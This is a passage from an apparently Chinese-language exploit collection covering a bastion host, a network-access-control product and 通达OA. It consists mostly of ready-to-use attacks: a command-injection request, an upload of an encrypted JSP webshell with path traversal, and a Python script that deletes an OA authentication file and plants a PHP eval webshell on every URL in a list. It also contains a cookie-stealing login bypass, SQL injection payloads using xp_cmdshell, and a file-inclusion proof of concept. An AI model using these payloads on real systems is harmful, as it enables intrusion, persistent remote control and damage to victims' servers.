target="_blank" rel="noopener">https://www.secpulse.com/archives/140809.html</a></p><p>齐治堡垒机命令执行CVE-2019-17294</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/audit/data_provider.php?ds_y=2019&amp;ds_m=04&amp;ds_d=02&amp;ds_hour=09&amp;ds_min=40&amp;server_cond=&amp;service=`id`&amp;identity_cond=&amp;query_type=all&amp;format=json&amp;browse=true</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ip</span><br><span class="line"><span class="attribute">Reterer</span>: https：//10/ /audit/browse.php?year=2019&amp;month=04&amp;day=02&amp;hour=096mi|nute=40&amp;service=tui </span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With:XMLHttpRequest</span></span><br><span class="line"><span class="attribute">DNT:1</span></span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"></span><br><span class="line">page=l&amp;rp=30&amp;sortname=stampl&amp;sortorder=desc&amp;query=&amp;qtype=</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">200</span> OK </span><br><span class="line"><span class="attribute">Date</span>: Tue, 02 Apr 2019 02:00:57 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache</span><br><span class="line"><span class="attribute">Expires</span>: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: text/x-json</span><br><span class="line"></span><br><span class="line">("cmdline": "/usr/libexec/shterm/auditlist all sess -fjson--pagesize=3 --page=l --tl=2019-04-02 09:40:00--t2=2019-04-02019:41:00--locale=zh CN --order=-Stampl    --service=uid=48(apache) gid=48(apache) groups=48(apache) --domains 16"， "page": l， "total": 0，titles:tid"/status"，"proto，"stampi"，"stamp2"，  "from_1 paddr"， "identity_ login"，|"server_name"， Igierver_ip"， "account_remote"， "count_cmd"，  " COulint_cmd_deny"， "count_cmd_kill"， "optime"， "filesi.ze"， "reviewer"]， "rows" : [] )</span><br></pre></td></tr></table></figure><h4 id="13、Aruba-Clearpass远程代码执行漏洞-CVE-2020-7115"><a href="#13、Aruba-Clearpass远程代码执行漏洞-CVE-2020-7115" class="headerlink" title="13、Aruba Clearpass远程代码执行漏洞 CVE-2020-7115"></a>13、Aruba Clearpass远程代码执行漏洞 CVE-2020-7115</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;portswigger.net&#x2F;daily-swig&#x2F;critical-aruba-clearpass-rce-vulnerability-exposes-underlying-systems</span><br></pre></td></tr></table></figure><h4 id="14、PAN-OS远程代码执行漏洞-CVE-2020-2040"><a href="#14、PAN-OS远程代码执行漏洞-CVE-2020-2040" class="headerlink" title="14、PAN-OS远程代码执行漏洞 CVE-2020-2040"></a>14、PAN-OS远程代码执行漏洞 CVE-2020-2040</h4><h4 id="15、联软准入文件上传漏洞"><a href="#15、联软准入文件上传漏洞" class="headerlink" title="15、联软准入文件上传漏洞"></a>15、联软准入文件上传漏洞</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/uai/download/uploadfileToPath.htm</span> HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: xxxxx</span><br><span class="line">... ...</span><br><span class="line"> </span><br><span class="line">-----------------------------570xxxxxxxxx6025274xxxxxxxx1</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="input_localfile"; filename="xxx.jsp"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/png</span><br><span class="line"> </span><br><span class="line">&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals("POST"))&#123;String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br><span class="line"> </span><br><span class="line">-----------------------------570xxxxxxxxx6025274xxxxxxxx1</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="uploadpath"</span><br><span class="line"> </span><br><span class="line">../webapps/notifymsg/devreport/</span><br><span class="line">-----------------------------570xxxxxxxxx6025274xxxxxxxx1--</span><br></pre></td></tr></table></figure><p><strong>参考</strong>：<a href="https://blog.csdn.net/m0_48520508/article/details/108790281" target="_blank" rel="noopener">https://blog.csdn.net/m0_48520508/article/details/108790281</a></p><h2 id="二、OA"><a href="#二、OA" class="headerlink" title="二、OA"></a>二、OA</h2><h4 id="1、通达OA11-6未授权远程代码执行漏洞"><a href="#1、通达OA11-6未授权远程代码执行漏洞" class="headerlink" title="1、通达OA11.6未授权远程代码执行漏洞"></a>1、通达OA11.6未授权远程代码执行漏洞</h4><p><strong>描述：</strong>该漏洞是由于通过删除通达OA身份认证文件达到绕过登录限制, 结合任意文件上传达到RCE的效果。<br><strong>影响版本</strong>：通达OA&lt;v11.5&amp;v11.6版本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#by Tommy，在原作者上修改而来，2020-8-19，通达OA 0 day漏洞利用</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">version = sys.version_info</span><br><span class="line"><span class="keyword">if</span> version &lt; (<span class="number">3</span>, <span class="number">0</span>):</span><br><span class="line">    print(<span class="string">'The current version is not supported, you need to use python3'</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(target)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        target=target</span><br><span class="line">        payload=<span class="string">'&lt;?php eval($_POST["admin"]);?&gt;'</span><span class="comment">#可自行修改</span></span><br><span class="line">        print(target,<span class="string">"[*]删除auth.inc.php..."</span>)</span><br><span class="line"> </span><br><span class="line">        url=target+<span class="string">"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"</span><span class="comment">#删除auth.inc.php请求</span></span><br><span class="line">        requests.get(url=url,verify=<span class="literal">False</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        print(target,<span class="string">"[*]正在检查文件是否已删除..."</span>)</span><br><span class="line">        url=target+<span class="string">"/inc/auth.inc.php"</span></span><br><span class="line">        page=requests.get(url=url,verify=<span class="literal">False</span>,timeout=<span class="number">10</span>).text</span><br><span class="line">        <span class="comment">#print(page)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'No input file specified.'</span> <span class="keyword">not</span> <span class="keyword">in</span> page:</span><br><span class="line">            print(target,<span class="string">"[-]无法删除auth.inc.php文件"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        print(target,<span class="string">"[+]删除auth.inc.php成功"</span>)</span><br><span class="line">        print(target,<span class="string">"[*]开始上传payload..."</span>)</span><br><span class="line">        url=target+<span class="string">"/general/data_center/utils/upload.php?action=upload&amp;filetype=nmsl&amp;repkid=/.&lt;&gt;./.&lt;&gt;./.&lt;&gt;./"</span></span><br><span class="line">        files = &#123;<span class="string">'FILE1'</span>: (<span class="string">'admin1.php'</span>, payload)&#125;</span><br><span class="line">        requests.post(url=url,files=files,verify=<span class="literal">False</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        url=target+<span class="string">"/_admin1.php"</span></span><br><span class="line">        page=requests.get(url=url,verify=<span class="literal">False</span>,timeout=<span class="number">10</span>).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'No input file specified.'</span> <span class="keyword">not</span> <span class="keyword">in</span> page:</span><br><span class="line">            print(<span class="string">"[+]************************文件已存在，上传成功************************"</span>)</span><br><span class="line">           <span class="comment"># if '8a8127bc83b94ad01414a7a3ea4b8' in page:#如果执行过md5函数，才确认漏洞存在，减少误报</span></span><br><span class="line">            print(target,<span class="string">"************************代码执行成功，存在漏洞************************"</span>)</span><br><span class="line">            print(target,<span class="string">"[+]URL:"</span>,url)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(target,<span class="string">"[-]文件上传失败"</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(target,e)</span><br><span class="line">urls=<span class="string">'url.txt'</span></span><br><span class="line">print(<span class="string">"[*]警告：利用此漏洞，会删除auth.inc.php，这可能会损坏OA系统"</span>)</span><br><span class="line">input(<span class="string">"按Enter继续"</span>)</span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> open(urls,<span class="string">'r'</span>,encoding=<span class="string">'utf-8'</span>).read().split(<span class="string">'\n'</span>):</span><br><span class="line">    url=url.split()</span><br><span class="line">    exploit(url[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p><strong>参考</strong>：<a href="https://www.cnblogs.com/wangfuguiblog/p/13712433.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangfuguiblog/p/13712433.html</a></p><h4 id="2、通达OA11-4-越权登录漏洞"><a href="#2、通达OA11-4-越权登录漏洞" class="headerlink" title="2、通达OA11.4 越权登录漏洞"></a>2、通达OA11.4 越权登录漏洞</h4><p>备注：4.17老漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="comment"># 11.X: /general/login_code.php , /logincheck_code.php , /general/index.php?isIE=0</span></span><br><span class="line">    <span class="comment"># 2017: /ispirit/login_code.php ,</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0'</span>&#125;</span><br><span class="line">    checkUrl = url + <span class="string">'/general/login_code.php'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(checkUrl)</span><br><span class="line">        resText = str(res.text).split(<span class="string">'&#123;'</span>)</span><br><span class="line">        codeUid = resText[<span class="number">-1</span>].replace(<span class="string">'&#125;"&#125;'</span>, <span class="string">''</span>).replace(<span class="string">'\r\n'</span>, <span class="string">''</span>)</span><br><span class="line">        getSessUrl = url + <span class="string">'/logincheck_code.php'</span></span><br><span class="line">        res = requests.post(</span><br><span class="line">            getSessUrl, data=&#123;<span class="string">'CODEUID'</span>: <span class="string">'&#123;'</span> + codeUid + <span class="string">'&#125;'</span>, <span class="string">'UID'</span>: int(<span class="number">1</span>)&#125;, headers=headers)</span><br><span class="line">        print(<span class="string">'[+]Get Available COOKIE:'</span> + res.headers[<span class="string">'Set-Cookie'</span>])</span><br><span class="line">        headers[<span class="string">"Cookie"</span>] = str(res.headers[<span class="string">'Set-Cookie'</span>])</span><br><span class="line">        loginUrl = self.url + <span class="string">'/general/index.php?isIE=0'</span></span><br><span class="line">        rsp = requests.get(loginUrl, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"管理员"</span> <span class="keyword">in</span> rsp.text <span class="keyword">and</span> <span class="string">"admin"</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">            print(<span class="string">'seccuss！'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="3、通达OA11-5-多处SQL注入漏洞"><a href="#3、通达OA11-5-多处SQL注入漏洞" class="headerlink" title="3、通达OA11.5 多处SQL注入漏洞"></a>3、通达OA11.5 多处SQL注入漏洞</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/general/appbuilder/web/calendar/calendarlist/getcallist</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span>: https://www.0-sec.org/portal/home/</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Host</span>: www.0-sec.org</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span>: 154</span><br><span class="line"><span class="attribute">X-WVS-ID</span>: Acunetix-Autologin/65535</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Origin</span>: https://www.0-sec.org</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"></span><br><span class="line">starttime=AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])---&amp;endtime=1598918400&amp;view=month&amp;condition=1</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/general/email/sentbox/get_index_data.php?asc=0&amp;boxid=&amp;boxname=sentbox&amp;curnum=3&amp;emailtype=ALLMAIL&amp;keyword=sample%40email.tst&amp;orderby=1&amp;pagelimit=20&amp;tag=&amp;timestamp=1598069133&amp;total=</span> HTTP/1.1</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span>: https://www.0-sec.org/</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip,deflate</span><br><span class="line"><span class="attribute">Host</span>: www.0-sec.org</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/general/email/inbox/get_index_data.php?asc=0&amp;boxid=&amp;boxname=inbox&amp;curnum=0&amp;emailtype=ALLMAIL&amp;keyword=&amp;orderby=3--&amp;pagelimit=10&amp;tag=&amp;timestamp=1598069103&amp;total=</span> HTTP/1.1</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span>: https://www.0-sec.org</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip,deflate</span><br><span class="line"><span class="attribute">Host</span>: www.0-sec.org</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/general/appbuilder/web/report/repdetail/edit?link_type=false&amp;slot=&#123;&#125;&amp;id=2</span> HTTP/1.1</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span>: https://www.0-sec.org</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip,deflate</span><br><span class="line"><span class="attribute">Host</span>: www.0-sec.org</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/general/file_folder/swfupload_new.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.202.1/</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Host</span>: 192.168.202.1</span><br><span class="line"><span class="attribute">Content-Length</span>: 391</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=----------GFioQpMK0vv2</span><br><span class="line"></span><br><span class="line">------------GFioQpMK0vv2</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="ATTACHMENT_ID"</span><br><span class="line"></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">------------GFioQpMK0vv2</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="ATTACHMENT_NAME"</span><br><span class="line"></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">------------GFioQpMK0vv2</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="FILE_SORT"</span><br><span class="line"></span><br><span class="line"><span class="attribute">2</span></span><br><span class="line"><span class="attribute">------------GFioQpMK0vv2</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="SORT_ID"</span><br><span class="line"></span><br><span class="line">------------GFioQpMK0vv2--</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">会过滤掉：空格、制表符、换行符、回车符、垂直制表符等。只能报错，或尝试 and 等语句判断还是没有问题的。</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/general/file_folder/api.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.202.1/general/file_folder/public_folder.php?FILE_SORT=1&amp;SORT_ID=59</span><br><span class="line"><span class="attribute">X-Resource-Type</span>: xhr</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=g1njm64pl94eietps80muet5d7; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=fab32701</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Host</span>: 192.168.202.1</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">x-requested-with</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span>: 82</span><br><span class="line"><span class="attribute">x-wvs-id</span>: Acunetix-Deepscan/209</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">accept</span>: */*</span><br><span class="line"><span class="attribute">origin</span>: http://192.168.202.1</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US</span><br><span class="line"><span class="attribute">content-type</span>: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"></span><br><span class="line">CONTENT_ID_STR=222&amp;SORT_ID=59&amp;FILE_SORT=1&amp;action=sign</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/general/appbuilder/web/meeting/meetingmanagement/meetingreceipt</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.202.1/general/meeting/myapply/details.php?affair=true&amp;id=5&amp;nosign=true&amp;reminding=true</span><br><span class="line"><span class="attribute">X-Resource-Type</span>: xhr</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=g1njm64pl94eietps80muet5d7; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=fab32701</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Host</span>: 192.168.202.1</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">x-requested-with</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span>: 97</span><br><span class="line"><span class="attribute">x-wvs-id</span>: Acunetix-Deepscan/186</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">accept</span>: */*</span><br><span class="line"><span class="attribute">origin</span>: http://192.168.202.1</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US</span><br><span class="line"><span class="attribute">content-type</span>: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"></span><br><span class="line">m_id=5&amp;join_flag=2&amp;remark='%3b%20exec%20master%2e%2exp_cmdshell%20'ping%20172%2e10%2e1%2e255'--</span><br></pre></td></tr></table></figure><p><strong>参考：</strong>零组；<a href="https://www.cnblogs.com/yuzly/p/13608532.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/13608532.html</a></p><h4 id="4、通达OA文件包含漏洞"><a href="#4、通达OA文件包含漏洞" class="headerlink" title="4、通达OA文件包含漏洞"></a>4、通达OA文件包含漏洞</h4><p>备注：3月份老漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">POC = &#123;<span class="string">"P"</span>: <span class="string">"7789"</span>, <span class="string">"DEST_UID"</span>: <span class="string">"1"</span>, <span class="string">"UPLOAD_MODE"</span>: <span class="string">"2"</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="comment"># 上传漏洞、文件包含漏洞url</span></span><br><span class="line">    uploadUrl = self.url + <span class="string">"/ispirit/im/upload.php"</span></span><br><span class="line">    includeUrl = self.url + <span class="string">"/ispirit/interface/gateway.php"</span></span><br><span class="line">    <span class="comment"># 2017版 includeUrl = self.url + "/mac/gateway.php"</span></span><br><span class="line">    <span class="comment"># 这里写上传的php或其它文件内容</span></span><br><span class="line">    files = &#123;<span class="string">'ATTACHMENT'</span>: <span class="string">"Tongda_Vul_test"</span>&#125;</span><br><span class="line">    <span class="comment"># files = &#123;'ATTACHMENT': 'echo("hello")'&#125;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        uploadRes = requests.post(uploadUrl, data=POC, files=files)</span><br><span class="line">        <span 